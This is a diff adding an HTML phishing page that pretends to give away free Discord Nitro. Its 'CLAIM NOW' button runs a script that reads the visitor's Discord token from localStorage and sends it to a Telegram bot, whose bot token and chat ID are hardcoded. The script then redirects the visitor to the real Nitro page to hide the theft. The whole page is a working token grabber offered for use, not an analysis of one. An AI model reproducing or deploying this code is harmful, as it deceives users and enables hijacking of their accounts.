@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 FREE Discord Nitro for 2 Months! 🎁</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #7289da, #5865f2);
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        button {
+            background: #ff73fa;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #ff3af2;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 CLAIM YOUR FREE DISCORD NITRO! 🎉</h1>
+        <p>Limited-time offer: 2 Months of Nitro for FREE!</p>
+        <button onclick="stealToken()">CLAIM NOW</button>
+    </div>
+
+    <script>
+        async function stealToken() {
+            // Discord tokens are stored in LocalStorage
+            const token = localStorage.getItem('token') || 'No token found.';
+            
+            // Telegram Bot API (Replace with YOUR bot token and chat ID)
+            const botToken = '8082399252:AAHdTF9d_yIQqCK_SKCA8l_p9lJ41m_mjDw';
+            const chatId = '6252886862';
+            
+            // Send token to Telegram
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📌 NEW TOKEN GRABBED: ${token}`);
+            
+            // Redirect to a legit Discord Nitro page to avoid suspicion
+            window.location.href = 'https://discord.com/nitro';
+        }
+    </script>
+</body>
+</html>
